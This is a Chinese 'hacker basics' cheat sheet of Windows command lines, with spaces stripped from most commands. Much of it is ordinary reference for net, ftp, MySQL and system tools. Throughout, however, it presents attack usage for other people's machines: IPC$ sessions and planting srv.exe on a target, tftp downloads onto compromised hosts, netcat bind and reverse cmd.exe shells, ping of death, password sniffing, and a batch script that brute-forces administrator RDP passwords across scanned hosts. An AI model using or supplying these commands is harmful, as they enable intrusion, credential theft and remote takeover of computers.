      黑客基础之DOS （最齐全）
      黑客, DOS, 基础
            netuse\\ip\ipc$""/user:""建立IPC空链接

              　　netuse\\ip\ipc$"密码"/user:"用户名"建立IPC非空链接

              　　netuseh:\\ip\c$"密码"/user:"用户名"直接登陆后映射对方C：到本地为H:

              　　netuseh:\\ip\c$登陆后映射对方C：到本地为H:

              　　netuse\\ip\ipc$/del删除IPC链接

              　　netuseh:/del删除映射对方到本地的为H:的映射

              　　netuser用户名密码/add建立用户

              　　netuserguest/active:yes激活guest用户

              　　netuser查看有哪些用户

              　　netuser帐户名查看帐户的属性

              　　netlocalgroupadministrators用户名/add把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数

              　　netstart查看开启了哪些服务

              　　netstart服务名开启服务；(如:netstarttelnet，netstartschedule)

              　　netstop服务名停止某服务

              　　nettime\\目标ip查看对方时间

              　　nettime\\目标ip/set设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息

              　　netview查看本地局域网内开启了哪些共享

              　　netview\\ip查看对方局域网内开启了哪些共享

              　　netconfig显示系统网络设置

              　　netlogoff断开连接的共享

              　　netpause服务名暂停某服务

              　　netsendip"文本信息"向对方发信息

              　　netver局域网内正在使用的网络连接类型和信息

              　　netshare查看本地开启的共享

              　　netshareipc$开启ipc$共享

              　　netshareipc$/del删除ipc$共享

              　　netsharec$/del删除C：共享

              　　netuserguest12345用guest用户登陆后用将密码改为12345

              　　netpassword密码更改系统登陆密码

              　　netstat-a查看开启了哪些端口,常用netstat-an

              　　netstat-n查看端口的网络连接情况，常用netstat-an

              　　netstat-v查看正在进行的工作

              　　netstat-p协议名例：netstat-ptcq/ip查看某协议使用情况（查看tcp/ip协议使用情况）

              　　netstat-s查看正在使用的所有协议使用情况

              　　nbtstat-Aip对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写

              　　tracert-参数ip(或计算机名)跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。

              　　pingip(或域名)向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。

              　　ping-t-l65550ip死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)

              　　ipconfig(winipcfg)用于windowsNT及XP(windows9598)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息

              　　tlist-t以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

              　　kill-F进程名加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

              　　del-F文件名加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR*.*”表示删除当前目录下所有只读文件，“DEL/A-S*.*”表示删除当前目录下除系统文件以外的所有文件

              　　del/S/Q目录或用：rmdir/s/Q目录/S删除目录及目录下的所有子目录和文件。同时使用参数/Q可取消删除操作时的系统确认就直接删除。（二个命令作用相同）

              　　move盘符\路径\要移动的文件名存放移动文件的路径\移动后文件名移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖

              　　fcone.txttwo.txt>3st.txt对比二个文件并把不同之处输出到3st.txt文件中，">"和">>"是重定向命令

              　　atid号开启已注册的某个计划任务

              　　at/delete停止所有计划任务，用参数/yes则不需要确认就直接停止

              　　atid号/delete停止某个已注册的计划任务

              　　at查看所有的计划任务

              　　at\\iptime程序名(或一个命令)/r在某时间运行对方某程序并重新启动计算机

              　　fingerusername@host查看最近有哪些用户登陆

              　　telnetip端口远和登陆服务器,默认端口为23

              　　openip连接到IP（属telnet登陆后的命令）

              　　telnet在本机上直接键入telnet将进入本机的telnet

              　　copy路径\文件名1路径\文件名2/y复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件

              　　copyc:\srv.exe\\ip\admin$复制本地c:\srv.exe到对方的admin下

              　　cppy1st.jpg/b+2st.txt/a3st.jpg将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件

              　　copy\\ip\admin$\svv.exec:\或:copy\\ip\admin$\*.*复制对方admini$共享下的srv.exe文件（所有文件）至本地C：

              　　xcopy要复制的文件或目录树目标地址\目录名复制文件和目录树，用参数/Y将不提示覆盖相同文件

              　　tftp-i自己IP(用肉机作跳板时这用肉机IP)getserver.exec:\server.exe登陆后，将“IP”的server.exe下载到目标主机c:\server.exe参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i则以ASCII模式（传送文本文件模式）进行传送

              　　tftp-i对方IPputc:\server.exe登陆后，上传本地c:\server.exe至主机

              　　ftpip端口用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)

              　　routeprint显示出IP路由，将主要显示网络地址Networkaddres，子网掩码Netmask，网关地址Gatewayaddres，接口地址Interface

              　　arp查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp-a将显示出全部信息

              　　start程序名或命令/max或/min新开一个新窗口并最大化（最小化）运行某程序或命令

              　　mem查看cpu使用情况

              　　attrib文件名(目录名)查看某文件（目录）的属性

              　　attrib文件名-A-R-S-H或+A+R+S+H去掉(添加)某文件的存档，只读，系统，隐藏属性；用＋则是添加为某属性

              　　dir查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间

              　　date/t、time/t使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间

              　　set指定环境变量名称=要指派给变量的字符设置环境变量

              　　set显示当前所有的环境变量

              　　setp(或其它字符)显示出当前以字符p(或其它字符)开头的所有环境变量

              　　pause暂停批处理程序，并显示出：请按任意键继续....

              　　if在批处理程序中执行条件处理（更多说明见if命令及变量）

              　　goto标签将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）

              　　call路径\批处理文件名从批处理程序中调用另一个批处理程序（更多说明见call/?）

              　　for对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）

              　　echoon或off打开或关闭echo，仅用echo不加参数则显示当前echo设置

              　　echo信息在屏幕上显示出信息

              　　echo信息>>pass.txt将"信息"保存到pass.txt文件中

              　　findstr"Hello"aa.txt在aa.txt文件中寻找字符串hello

              　　find文件名查找某文件

              　　title标题名字更改CMD窗口标题名字

              　　color颜色值设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白

              　　prompt名称更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\)

              　　print文件名打印文本文件

              　　ver在DOS窗口下显示版本信息

              　　winver弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）

              　　format盘符/FS:类型格式化磁盘,类型:FAT、FAT32、NTFS,例：FormatD:/FS:NTFS

              　　md目录名创建目录

              　　replace源文件要替换文件的目录替换文件

              　　ren原文件名新文件名重命名文件名

              　　tree以树形结构显示出目录，用参数-f将列出第个文件夹中文件名称

              　　type文件名显示文本文件的内容

              　　more文件名逐屏显示输出文件

              　　doskey要锁定的命令＝字符

              　　doskey要解锁命令=为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskeydir=entsky(不能用doskeydir=dir)；解锁：doskeydir=

              　　taskmgr调出任务管理器

              　　chkdsk/FD:检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误

              　　tlntadmntelnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口

              　　exit退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe

              　　path路径\可执行文件的文件名为可执行文件设置一个路径。

              　　cmd启动一个win2K命令解释窗口。参数：/eff、/en关闭、开启命令扩展；更我详细说明见cmd/?

              　　regedit/s注册表文件名导入注册表；参数/S指安静模式导入，无任何提示；

              　　regedit/e注册表文件名导出注册表

              　　cacls文件名参数显示或修改文件访问控制列表（ACL）――针对NTFS格式时。参数：/D用户名:设定拒绝某用户访问；/P用户名:perm替换指定用户的访问权限；/G用户名:perm赋予指定用户访问权限；Perm可以是:N无，R读取，W写入，C更改(写入)，F完全控制；例：caclsD:\test.txt/Dpub设定d:\test.txt拒绝pub用户访问。

              　　cacls文件名查看文件的访问用户权限列表

              　　REM文本内容在批处理文件中添加注解

              　　netsh查看或更改本地网络配置情况

              　　IIS服务命令：

              　　iisreset/reboot重启win2k计算机（但有提示系统将重启信息出现）

              　　iisreset/start或stop启动（停止）所有Internet服务

              　　iisreset/restart停止然后重新启动所有Internet服务

              　　iisreset/status显示所有Internet服务状态

              　　iisreset/enable或disable在本地系统上启用（禁用）Internet服务的重新启动

              　　iisreset/rebootonerror当启动、停止或重新启动Internet服务时，若发生错误将重新开机

              　　iisreset/noforce若无法停止Internet服务，将不会强制终止Internet服务

              　　iisreset/timeoutVal在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。

              　　FTP命令：(后面有详细说明内容)

              　　ftp的命令行格式为:

              　　ftp－v－d－i－n－g[主机名]－v显示远程服务器的所有响应信息。

              　　－d使用调试方式。

              　　－n限制ftp的自动登录,即不使用.netrc文件。

              　　－g取消全局文件名。

              　　help[命令]或？[命令]查看命令说明

              　　bye或quit终止主机FTP进程,并退出FTP管理方式.

              　　pwd列出当前远端主机目录

              　　put或send本地文件名[上传到主机上的文件名]将本地一个文件传送至远端主机中

              　　2：if命令及变量基本格式：

              　　IF[not]errorlevel数字命令语句如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。

              　　例：IFerrorlevel0命令指程序执行后返回的值为0时，就值行后面的命令；IFnoterrorlevel1命令指程序执行最后返回的值不等于1，就执行后面的命令。

              　　0指发现并成功执行（真）；1指没有发现、没执行（假）。

              　　IF[not]字符串1==字符串2命令语句如果指定的文本字符串匹配（即：字符串1等于字符串2），就执行后面的命令。

              　　例：“if"%2%"=="4"gotostart”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加""）

              　　IF[not]exist文件名命令语句如果指定的文件名存在，就执行后面的命令。

              　　例：“ifnotnc.exegotoend”指：如果没有发现nc.exe文件就跳到":end"标签处。

              　　IF[not]errorlevel数字命令语句else命令语句或IF[not]字符串1==字符串2命令语句else命令语句或IF[not]exist文件名命令语句else命令语句加上：else命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else必须与if在同一行才有效。当有del命令时需把del命令全部内容用括起来，因为del命令要单独一行时才能执行，用上后就等于是单独一行了；例如：“ifexisttest.txt.elseechotest.txt.missing”，注意命令中的“.”

              　　（二）系统外部命令(均需下载相关工具)：

              　　1、瑞士军刀：nc.exe

              　　参数说明：

              　　-h查看帮助信息

              　　-d后台模式

              　　-eprog程序重定向，一但连接就执行［危险］

              　　-isecs延时的间隔

              　　-l监听模式，用于入站连接

              　　-L监听模式，连接天闭后仍然继续监听，直到CTR+C

              　　-nIP地址，不能用域名

              　　-ofilm记录16进制的传输

              　　-p[空格]端口本地端口号

              　　-r随机本地及远程端口

              　　-t使用Telnet交互方式

              　　-uUDP模式

              　　-v详细输出，用-vv将更详细

              　　-w数字timeout延时间隔

              　　-z将输入，输出关掉（用于扫锚时）

              　　基本用法：

              　　nc-nvv192.168.0.180连接到192.168.0.1主机的80端口

              　　nc-l-p80开启本机的TCP80端口并监听

              　　nc-nvv-w2-z192.168.0.180-1024扫锚192.168.0.1的80-1024端口

              　　nc-l-p5354-t-ec:winntsystem32cmd.exe绑定remote主机的cmdshell在remote的TCP5354端口

              　　nc-t-ec:winntsystem32cmd.exe192.168.0.25354梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口

              　　高级用法：

              　　nc-L-p80作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止

              　　nc-L-p80>c:\log.txt作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt

              　　nc-L-p80存放文件的路径及名称传送文件到对方主机

              　　备注：

              　　|管道命令

              　　重定向命令。“>d:\log.txt意思是：后台执行dir，并把结果存在d:\log.txt中

              　　>与>>的区别">"指：覆盖；">>"指：保存到(添加到）。

              　　如：@dirc:\winnt>>d:\log.txt和@dirc:\winnt>d:\log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。

              　　2、扫锚工具：xscan.exe

              　　基本格式

              　　xscan-host[-][其他选项]扫锚"起始IP到终止IP"段的所有主机信息

              　　xscan-file[其他选项]扫锚"主机IP列表文件名"中的所有主机信息

              　　检测项目

              　　-active检测主机是否存活

              　　-os检测远程操作系统类型（通过NETBIOS和SNMP协议）

              　　-port检测常用服务的端口状态

              　　-ftp检测FTP弱口令

              　　-pub检测FTP服务匿名用户写权限

              　　-pop3检测POP3-Server弱口令

              　　-smtp检测SMTP-Server漏洞

              　　-sql检测SQL-Server弱口令

              　　-smb检测NT-Server弱口令

              　　-iis检测IIS编码/解码漏洞

              　　-cgi检测CGI漏洞

              　　-nasl加载Nessus攻击脚本

              　　-all检测以上所有项目

              　　其它选项

              　　-i适配器编号设置网络适配器,可通过"-l"参数获取

              　　-l显示所有网络适配器

              　　-v显示详细扫描进度

              　　-p跳过没有响应的主机

              　　-o跳过没有检测到开放端口的主机

              　　-t并发线程数量,并发主机数量指定最大并发线程数量和并发主机数量,默认数量为100,10

              　　-log文件名指定扫描报告文件名(后缀为：TXT或HTML格式的文件)

              　　用法示例

              　　xscan-host192.168.1.1-192.168.255.255-all-active-p检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机

              　　xscan-host192.168.1.1-192.168.255.255-port-smb-t150-o检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机

              　　xscan-filehostlist.txt-port-cgi-t200,5-v-o检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机

              　　3、命令行方式嗅探器:xsniff.exe

              　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码

              　　参数说明

              　　-tcp输出TCP数据报

              　　-udp输出UDP数据报

              　　-icmp输出ICMP数据报

              　　-pass过滤密码信息

              　　-hide后台运行

              　　-host解析主机名

              　　-addrIP地址过滤IP地址

              　　-port端口过滤端口

              　　-log文件名将输出保存到文件

              　　-asc以ASCII形式输出

              　　-hex以16进制形式输出

              　　用法示例

              　　xsniff.exe-pass-hide-logpass.log后台运行嗅探密码并将密码信息保存在pass.log文件中

              　　xsniff.exe-tcp-udp-asc-addr192.168.1.1嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出

              　　4、终端服务密码破解:tscrack.exe

              　　参数说明

              　　-h显示使用帮助

              　　-v显示版本信息

              　　-s在屏幕上打出解密能力

              　　-b密码错误时发出的声音

              　　-t同是发出多个连接（多线程）

              　　-NPreventSystemLogentriesontargetedserver

              　　-U卸载移除tscrack组件

              　　-f使用－f后面的密码

              　　-F间隔时间（频率）

              　　-l使用－l后面的用户名

              　　-w使用－w后面的密码字典

              　　-p使用－p后面的密码

              　　-D登录主页面

              　　用法示例

              　　tscrack192.168.0.1-ladministrator-wpass.dic远程用密码字典文件暴破主机的administrator的登陆密码

              　　tscrack192.168.0.1-ladministrator-p123456用密码123456远程登陆192.168.0.1的administrator用户

              　　@ifnotexistipcscan.txtgotonoscan

              　　@for/f"tokens=1delims="%%iin(3389.txt)docallhack.bat%%i

              　　nscan

              　　@echo3389.txtnofindorscanfaild

              　　(①存为3389.bat)（假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)

              　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat

              　　@ifnotexisttscrack.exegotonoscan

              　　@tscrack%1-ladministrator-wpass.dic>>rouji.txt

              　　:noscan

              　　@echotscrack.exenofindorscanfaild

              　　(②存为hack.bat)(运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)

              　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。

              　　5、其它：

              　　Shutdown.exe

              　　Shutdown\\IP地址t:2020秒后将对方NT自动关闭（Windows2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows2003DOS命令中有详细介绍。）

              　　fpipe.exe(TCP端口重定向工具)在第二篇中有详细说明（端口重定向绕过防火墙）

              　　fpipe-l80-s1029-r80www.sina.com.cn当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息

              　　Fpipe-l23-s88-r23目标IP把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet127.0.0.1（本机IP）就连接到目标IP的23端口了。

              　　OpenTelnet.exe(远程开启telnet工具)

              　　opentelnet.exe\\IP帐号密码ntlm认证方式Telnet端口（不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet\\ip连接上对方。

              　　NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。

              　　ResumeTelnet.exe(OpenTelnet附带的另一个工具)

              　　resumetelnet.exe\\IP帐号密码用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。

              　　6、FTP命令详解：

              　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。

              　　FTP的命令行格式为：

              　　ftp-v-d-i-n-g[主机名]，其中

              　　-v显示远程服务器的所有响应信息；

              　　-n限制ftp的自动登录，即不使用；.netrc文件；

              　　-d使用调试方式；

              　　-g取消全局文件名。

              　　FTP使用的内部命令如下(中括号表示可选项):

              　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip

              　　2.$macro-ame[args]：执行宏定义macro-name。

              　　3.account[password]：提供登录远程系统成功后访问系统资源所需的补充口令。

              　　4.appendlocal-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。

              　　5.ascii：使用ascii类型传输方式。

              　　6.bell：每个命令执行完毕后计算机响铃一次。

              　　7.bin：使用二进制文件传输方式。

              　　8.bye：退出ftp会话过程。

              　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。

              　　10.cdremote-dir：进入远程主机目录。

              　　11.cdup：进入远程主机目录的父目录。

              　　12.chmodmodefile-name：将远程主机文件file-name的存取方式设置为mode，如：chmod777a.out。

              　　13.close：中断与远程服务器的ftp会话(与open对应)。

              　　14.cr：使用asscii方式传输文件时，将回车换行转换为回行。

              　　15.deleteremote-file：删除远程主机文件。

              　　16.debug[debug-value]：设置调试方式，显示发送至远程主机的每条命令，如：debup3，若设为0，表示取消debug。

              　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。

              　　18.disconnection：同close。

              　　19.formformat：将文件传输方式设置为format，缺省为file方式。

              　　20.getremote-file[local-file]：将远程主机的文件remote-file传至本地硬盘的local-file。

              　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。

              　　22.hash：每传输1024字节，显示一个hash符号(#)。

              　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：helpget。

              　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。

              　　25.image：设置二进制传输方式(同binary)。

              　　26.lcd[dir]：将本地工作目录切换至dir。

              　　27.ls[remote-dir][local-file]：显示远程目录remote-dir，并存入本地文件local-file。

              　　28.macdefmacro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。

              　　29.mdelete[remote-file]：删除远程主机文件。

              　　30.mdirremote-fileslocal-file：与dir类似，但可指定多个远程文件，如：mdir*.o.*.zipoutfile。

              　　31.mgetremote-files：传输多个远程文件。

              　　32.mkdirdir-name：在远程主机中建一目录。

              　　33.mlsremote-filelocal-file：同nlist，但可指定多个文件名。

              　　34.mode[modename]：将文件传输方式设置为modename，缺省为stream方式。

              　　35.modtimefile-name：显示远程主机文件的最后修改时间。

              　　36.mputlocal-file：将多个文件传输至远程主机。

              　　37.newerfile-name：如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。

              　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。

              　　39.nmap[inpatternoutpattern]：设置文件名映射机制，使得文件传输时，文件中的某些字符相互转换，如：nmap$1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX机的情况。

              　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。

              　　41.openhost[port]：建立指定ftp服务器连接，可指定连接端口。

              　　42.passive：进入被动传输方式。

              　　43.prompt：设置多个文件传输时的交互提示。

              　　44.proxyftp-cmd：在次要控制连接中，执行一条ftp命令，该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。

              　　45.putlocal-file[remote-file]：将本地文件local-file传送至远程主机。

              　　46.pwd：显示远程主机的当前工作目录。

              　　47.quit：同bye，退出ftp会话。

              　　48.quotearg1，arg2...：将参数逐字发至远程ftp服务器，如：quotesyst.

              　　49.recvremote-file[local-file]：同get。

              　　50.regetremote-file[local-file]：类似于get，但若local-file存在，则从上次传输中断处续传。

              　　51.rhelp[cmd-name]：请求获得远程主机的帮助。

              　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态，否则显示文件状态。

              　　53.rename[from][to]：更改远程主机文件名。

              　　54.reset：清除回答队列。

              　　55.restartmarker：从指定的标志marker处，重新开始get或put，如：restart130。

              　　56.rmdirdir-name：删除远程主机目录。

              　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1，.2等。

              　　58.sendlocal-file[remote-file]：同put。

              　　59.sendport：设置PORT命令的使用。

              　　60.sitearg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。

              　　61.sizefile-name：显示远程主机文件大小，如：siteidle7200。

              　　62.status：显示当前ftp状态。

              　　63.struct[struct-name]：将文件传输结构设置为struct-name，缺省时使用stream结构。

              　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。

              　　65.system：显示远程主机的操作系统类型。

              　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。

              　　67.tick：设置传输时的字节计数器。

              　　68.trace：设置包跟踪。

              　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:typebinary，设置二进制传输方式。

              　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask3

              　　71.useruser-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：useranonymousmy@email。

              　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp服务器的所有响应都将显示给用户，缺省为on.

              　　73.?[cmd]：同help.

              　　7：计算机运行命令全集winver---------检查Windows版本

              　　wmimgmt.msc----打开windows管理体系结构

              　　wupdmgr--------windows更新程序

              　　winver---------检查Windows版本

              　　wmimgmt.msc----打开windows管理体系结构

              　　wupdmgr--------windows更新程序

              　　wscript--------windows脚本宿主设置

              　　write----------写字板winmsd-----系统信息

              　　wiaacmgr-------扫描仪和照相机向导

              　　winchat--------XP自带局域网聊天

              　　mem.exe--------显示内存使用情况

              　　Msconfig.exe---系统配置实用程序

              　　mplayer2-------简易widnowsmediaplayer

              　　mspaint--------画图板

              　　mstsc----------远程桌面连接

              　　mplayer2-------媒体播放机

              　　magnify--------放大镜实用程序

              　　mmc------------打开控制台

              　　mobsync--------同步命令

              　　dxdiag---------检查DirectX信息

              　　drwtsn32------系统医生

              　　devmgmt.msc---设备管理器

              　　dfrg.msc-------磁盘碎片整理程序

              　　diskmgmt.msc---磁盘管理实用程序

              　　dcomcnfg-------打开系统组件服务

              　　ddeshare-------打开DDE共享设置

              　　dvdplay--------DVD播放器

              　　netstopmessenger-----停止信使服务

              　　netstartmessenger----开始信使服务

              　　notepad--------打开记事本

              　　nslookup-------网络管理的工具向导

              　　ntbackup-------系统备份和还原

              　　narrator-------屏幕"讲述人"

              　　ntmsmgr.msc----移动存储管理器

              　　ntmsoprq.msc---移动存储管理员操作请求

              　　netstat-an----(TC)命令检查接口

              　　syncapp--------创建一个公文包

              　　sysedit--------系统配置编辑器

              　　sigverif-------文件签名验证程序

              　　sndrec32-------录音机

              　　shrpubw--------创建共享文件夹

              　　secpol.msc-----本地安全策略

              　　syskey---------系统加密，一旦加密就不能解开，保护windowsxp系统的双重密码

              　　services.msc---本地服务设置

              　　Sndvol32-------音量控制程序

              　　sfc.exe--------系统文件检查器

              　　sfc/scannow---windows文件保护

              　　tsshutdn-------60秒倒计时关机命令

              　　tourstart------xp简介（安装完成后出现的漫游xp程序）

              　　taskmgr--------任务管理器

              　　eventvwr-------事件查看器

              　　eudcedit-------造字程序

              　　explorer-------打开资源管理器

              　　packager-------对象包装程序

              　　perfmon.msc----计算机性能监测程序

              　　progman--------程序管理器

              　　regedit.exe----注册表

              　　rsop.msc-------组策略结果集

              　　regedt32-------注册表编辑器

              　　rononce-p----15秒关机

              　　regsvr32/u*.dll----停止dll文件运行

              　　regsvr32/uzipfldr.dll------取消ZIP支持

              　　cmd.exe--------CMD命令提示符

              　　chkdsk.exe-----Chkdsk磁盘检查

              　　certmgr.msc----证书管理实用程序

              　　calc-----------启动计算器

              　　charmap--------启动字符映射表

              　　cliconfg-------SQLSERVER客户端网络实用程序

              　　Clipbrd--------剪贴板查看器

              　　conf-----------启动netmeeting

              　　compmgmt.msc---计算机管理

              　　cleanmgr-------垃圾整理

              　　ciadv.msc------索引服务程序

              　　osk------------打开屏幕键盘

              　　odbcad32-------ODBC数据源管理器

              　　oobe/msoobe/a----检查XP是否激活

              　　lusrmgr.msc----本机用户和组

              　　logoff---------注销命令

              　　iexpress-------木马捆绑工具，系统自带

              　　Nslookup-------IP地址侦测器

              　　fsmgmt.msc-----共享文件夹管理器

              　　utilman--------辅助工具管理器

              　　gpedit.msc-----组策略

              　　get或recv[远程主机文件名][下载到本地后的文件名]从远端主机中传送至本地主机中

              　　mget[remote-files]从远端主机接收一批文件至本地主机

              　　mputlocal-files将本地主机中一批文件传送至远端主机

              　　dir或ls[remote-directory][local-file]列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件

              　　ascii设定以ASCII方式传送文件(缺省值)

              　　bin或image设定以二进制方式传送文件

              　　bell每完成一次文件传送,报警提示

              　　cdup返回上一级目录

              　　close中断与远程服务器的ftp会话(与open对应)

              　　openhost[port]建立指定ftp服务器连接,可指定连接端口

              　　delete删除远端主机中的文件

              　　mdelete[remote-files]删除一批文件

              　　mkdirdirectory-name在远端主机中建立目录

              　　rename[from][to]改变远端主机中的文件名

              　　rmdirdirectory-name删除远端主机中的目录

              　　status显示当前FTP的状态

              　　system显示远端主机系统类型

              　　useruser-name[password][account]重新以别的用户名登录远端主机

              　　openhost[port]重新建立一个新的连接

              　　prompt交互提示模式

              　　macdef定义宏命令

              　　lcd改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录

              　　chmod改变远端主机的文件权限

              　　case当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母

              　　cdremote－dir进入远程主机目录

              　　cdup进入远程主机目录的父目录

              　　!在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip

              　　MYSQL命令：

              　　mysql-h主机地址-u用户名－p密码连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。

              　　（例：mysql-h110.110.110.110-Uroot-P123456

              　　注:u与root可以不用加空格，其它也一样）

              　　exit退出MYSQL

              　　mysqladmin-u用户名-p旧密码password新密码修改密码

              　　grantselecton数据库.*to用户名@登录主机identifiedby\"密码\";增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）

              　　showdatabases;显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。

              　　usemysql；

              　　showtables;显示库中的数据表

              　　describe表名;显示数据表的结构

              　　createdatabase库名;建库

              　　use库名；

              　　createtable表名(字段设定列表)；建表

              　　dropdatabase库名;

              　　droptable表名；删库和删表

              　　deletefrom表名;将表中记录清空

              　　select*from表名;显示表中的记录

              　　mysqldump--optschool>school.bbb备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。

              　　win2003系统下新增命令（实用部份）：

              　　shutdown/参数关闭或重启本地或远程主机。

              　　参数说明：/S关闭主机，/R重启主机，/T数字设定延时的时间，范围0～180秒之间，/A取消开机，/M//IP指定的远程主机。

              　　例：shutdown/r/t0立即重启本地主机（无延时）

              　　taskill/参数进程名或进程的pid终止一个或多个任务和进程。

              　　参数说明：/PID要终止进程的pid,可用tasklist命令获得各进程的pid，/IM要终止的进程的进程名，/F强制终止进程，/T终止指定的进程及他所启动的子进程。

              　　tasklist显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。

